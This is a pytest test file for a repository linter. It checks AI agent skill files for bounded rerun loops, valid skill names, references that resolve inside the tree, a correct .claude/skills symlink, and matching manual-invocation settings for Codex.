def test_a_rerun_after_a_fix_is_bounded_in_every_markdown_file_under_skills(repo, skills, capsys, said):
    conventions(repo, f"## After writing\n\n1. {said}\n")
    assert skills.main() == 1
    assert f"{CONVENTIONS}: a step fixes and runs again with no count bound" in capsys.readouterr().out
    conventions(repo, f"## After writing\n\n1. {said} The first run plus at most 1 rerun.\n")
    assert skills.main() == 0


def test_an_at_most_that_counts_something_else_is_no_bound(repo, skills, capsys):
    conventions(repo, "1. Fix what it reports and rerun it. Keep at most 3 imports per line.\n")
    assert skills.main() == 1
    assert f"{CONVENTIONS}: a step fixes and runs again with no count bound" in capsys.readouterr().out
    conventions(repo, "1. Fix what it reports and rerun it, at most 2 reruns. Keep at most 3 imports per line.\n")
    assert skills.main() == 0


@pytest.mark.parametrize(
    "text",
    [
        "```text\nFix it and rerun `make check`.\n```\n",
        "| File | Holds |\n|---|---|\n| `client.py` | a fix, retried and run again |\n",
        "Fix the tree.\n\nThen run `make check` again.\n",
        "The fixture reruns `make check`.\n",
        "Fix the tree. Then run the tests. Nothing is fixed twice.\n",
    ],
)
def test_fenced_code_a_table_row_or_a_fix_in_another_paragraph_is_no_loop(repo, skills, text):
    conventions(repo, text)
    assert skills.main() == 0


def looping(name: str, procedure: str) -> str:
    """A scaffold skill of `name` whose procedure is `procedure`, with the role section an audit has."""
    head = f'---\nname: {name}\ndescription: "Run {name}."\nallowed-tools: Read\n---\n\n# {name}\n\n'
    return f"{head}## Role and credential\n\nNone, local only.\n\n## Procedure\n\n{procedure}\n"


def test_each_loop_bound_of_an_ops_skill_is_held_and_named_when_dropped(repo, skills, capsys):
    operational_skills(repo, {name: "none" for name in skills.LOOP_BOUNDS if name.startswith("audit-")})
    for name, bounds in skills.LOOP_BOUNDS.items():
        repo.write(copied(name), looping(name, "\n".join(f"{i}. It says {bound}." for i, bound in enumerate(bounds, 1))))
    assert skills.main() == 0
    for name, bounds in skills.LOOP_BOUNDS.items():
        whole = repo.read(copied(name))
        for bound in bounds:
            repo.write(copied(name), whole.replace(f"It says {bound}.", "It says nothing of it."))
            assert skills.main() == 1
            out = capsys.readouterr().out
            assert f"{copied(name)}: does not say {bound!r}; each loop an ops skill runs states its count" in out
            assert "1 problem(s)" in out
        repo.write(copied(name), whole)


def test_a_bound_is_read_across_line_breaks_and_never_from_fenced_code(repo, skills, capsys):
    repo.write(
        copied("stress-test-run"), looping("stress-test-run", "1. Report. A session follows at\n   most 2 hops of\n   Next.")
    )
    assert skills.main() == 0
    repo.write(copied("stress-test-run"), looping("stress-test-run", "1. Report.\n\n```text\nat most 2 hops of Next\n```"))
    assert skills.main() == 1
    assert f"{copied('stress-test-run')}: does not say 'at most 2 hops of Next'" in capsys.readouterr().out


def test_every_skill_the_loop_bounds_name_is_one_the_scaffold_has(skills):
    """A skill the scaffold does not have is not read, so a renamed skill would drop its bounds unseen."""
    real = Path(__file__).resolve().parent.parent / COPIED
    assert [name for name in sorted(skills.LOOP_BOUNDS) if not (real / name / "SKILL.md").is_file()] == []


def test_a_scaffold_skill_name_the_standard_refuses_fails(repo, skills, capsys):
    repo.write(copied("ops--watch"), '---\nname: ops--watch\ndescription: "Watch."\nallowed-tools: Read\n---\n')
    assert skills.main() == 1
    assert (
        f"{copied('ops--watch')}: name 'ops--watch' is not lowercase words joined by one hyphen each" in capsys.readouterr().out
    )


def test_a_plugin_skill_name_with_a_doubled_hyphen_fails(repo, skills, capsys):
    repo.write("skills/arch--odd/SKILL.md", '---\nname: arch--odd\ndescription: "Odd."\nallowed-tools: Read\n---\n')
    assert skills.main() == 1
    assert "skills/arch--odd/SKILL.md: name 'arch--odd' must match" in capsys.readouterr().out


def test_a_scaffold_skill_path_resolves_inside_the_tree_a_copy_carries(repo, skills, capsys):
    head = '---\nname: ops-infra-as-code\ndescription: "Plan."\nallowed-tools: Read\n---\n\n'
    repo.write(f"{COPIED}/_shared/ops-preamble.md", "# Preamble\n")
    repo.write(copied("ops-infra-as-code"), head + "Read `../_shared/ops-preamble.md` first.\n")
    assert skills.main() == 0
    repo.write(copied("ops-infra-as-code"), head + "Read `../_shared/gone.md` first.\n")
    assert skills.main() == 1
    assert f"{copied('ops-infra-as-code')}: reference ../_shared/gone.md does not exist" in capsys.readouterr().out
    repo.write("scaffold/outside.md", "# Outside\n")
    repo.write(copied("ops-infra-as-code"), head + "Read `../../../../outside.md` first.\n")
    assert skills.main() == 1
    assert "reference ../../../../outside.md resolves outside scaffold/acme_root" in capsys.readouterr().out


def test_the_scaffolds_claude_skills_is_a_link_to_its_agents_skills(repo, skills, capsys, claude_link):
    repo.write(copied("ops-infra-as-code"), '---\nname: ops-infra-as-code\ndescription: "Plan."\nallowed-tools: Read\n---\n')
    assert skills.main() == 0
    assert os.readlink(claude_link) == "../.agents/skills"
    claude_link.unlink()
    claude_link.symlink_to("../skills")
    assert skills.main() == 1
    assert f"{LINK}: links to '../skills'; it links to '../.agents/skills'" in capsys.readouterr().out
    claude_link.unlink()
    claude_link.mkdir()
    assert skills.main() == 1
    assert f"{LINK}: not a link" in capsys.readouterr().out


def test_a_path_out_of_the_folder_says_to_resolve_the_folder_with_realpath(repo, skills, capsys):
    assert skills.main() == 0
    repo.edit("skills/arch-review-om/SKILL.md", " as `realpath`\nresolves it", "")
    assert skills.main() == 1
    assert (
        "skills/arch-review-om/SKILL.md: names a path out of its folder (../) and never says to read it as `realpath`"
        in capsys.readouterr().out
    )
    repo.write("skills/_shared/scaffold-conventions.md", "# Conventions\n\nRead `../../lenses/om.md`.\n")
    assert skills.main() == 1
    assert "skills/_shared/scaffold-conventions.md: names a path out of the skill's folder" in capsys.readouterr().out


MANUAL = "allowed-tools: Read, Agent\ndisable-model-invocation: true\n"
IMPLICIT_OFF = "# Codex\npolicy:\n  allow_implicit_invocation: false\n"


def test_a_skill_a_person_starts_by_name_says_so_to_codex_too(repo, skills, capsys):
    repo.edit("skills/arch-review-full/SKILL.md", "allowed-tools: Read, Agent\n", MANUAL)
    head = (
        '---\nname: ops-cloud-deployment-nuke\ndescription: "Destroy."\nallowed-tools: Read\n'
        "disable-model-invocation: true\n---\n"
    )
    repo.write(copied("ops-cloud-deployment-nuke"), head)
    assert skills.main() == 1
    out = capsys.readouterr().out
    assert (
        "skills/arch-review-full/SKILL.md: disable-model-invocation is true, but "
        "skills/arch-review-full/agents/openai.yaml does not set policy.allow_implicit_invocation: false" in out
    )
    assert f"{copied('ops-cloud-deployment-nuke')}: disable-model-invocation is true" in out
    repo.write("skills/arch-review-full/agents/openai.yaml", IMPLICIT_OFF)
    repo.write(f"{COPIED}/ops-cloud-deployment-nuke/agents/openai.yaml", IMPLICIT_OFF)
    assert skills.main() == 0
    repo.write("skills/arch-review-full/agents/openai.yaml", "policy:\n  allow_implicit_invocation: true\n")
    assert skills.main() == 1
    assert "skills/arch-review-full/agents/openai.yaml does not set" in capsys.readouterr().out


def test_codex_s_switch_without_the_key_fails(repo, skills, capsys):
    repo.write("skills/arch-review-full/agents/openai.yaml", IMPLICIT_OFF)
    assert skills.main() == 1
    assert (
        "skills/arch-review-full/SKILL.md: skills/arch-review-full/agents/openai.yaml turns implicit invocation off; "
        "say disable-model-invocation: true too" in capsys.readouterr().out
    )
